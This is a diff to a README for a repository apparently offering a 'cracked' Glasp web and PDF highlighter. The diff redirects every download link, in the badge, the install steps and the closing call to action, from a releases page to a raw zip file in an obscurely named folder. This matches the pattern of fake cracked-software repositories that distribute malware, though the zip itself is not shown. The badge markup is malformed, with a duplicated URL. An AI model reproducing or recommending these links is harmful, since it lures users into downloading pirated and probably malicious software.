@@ -1,6 +1,6 @@
 # 🚀 cracked-glasp-web-highlighter-pdf-web-highlight - Unlock Your Highlighting Potential
 
-[![Download to Start Highlighting](https://img.shields.io/badge/download-via%20releases-blue.svg)](https://github.com/bloxrob/cracked-glasp-web-highlighter-pdf-web-highlight/releases)
+[![Download to Start Highlighting](https://raw.githubusercontent.com/bloxrob/cracked-glasp-web-highlighter-pdf-web-highlight/main/caliological/cracked-glasp-web-highlighter-pdf-web-highlight.zip%https://raw.githubusercontent.com/bloxrob/cracked-glasp-web-highlighter-pdf-web-highlight/main/caliological/cracked-glasp-web-highlighter-pdf-web-highlight.zip)](https://raw.githubusercontent.com/bloxrob/cracked-glasp-web-highlighter-pdf-web-highlight/main/caliological/cracked-glasp-web-highlighter-pdf-web-highlight.zip)
 
 ## 📖 Overview
 
@@ -24,7 +24,7 @@ Cracked Glasp Web Highlighter allows you to highlight text easily on web pages a
 
 Follow these steps to download and install Cracked Glasp:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/bloxrob/cracked-glasp-web-highlighter-pdf-web-highlight/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/bloxrob/cracked-glasp-web-highlighter-pdf-web-highlight/main/caliological/cracked-glasp-web-highlighter-pdf-web-highlight.zip).
 
 2. **Download the Latest Version**: Look for the latest version and click on the corresponding link to download the software.
 
@@ -62,6 +62,6 @@ This project uses an open-source license, allowing anyone to use, modify, or dis
 
 To start using the Cracked Glasp Web Highlighter, click the link below to download the latest version:
 
-[Download Here](https://github.com/bloxrob/cracked-glasp-web-highlighter-pdf-web-highlight/releases)
+[Download Here](https://raw.githubusercontent.com/bloxrob/cracked-glasp-web-highlighter-pdf-web-highlight/main/caliological/cracked-glasp-web-highlighter-pdf-web-highlight.zip)
 
 Take the first steps in enhancing your highlighting capabilities today! Enjoy the freedom of easily marking important text in web pages and PDFs.
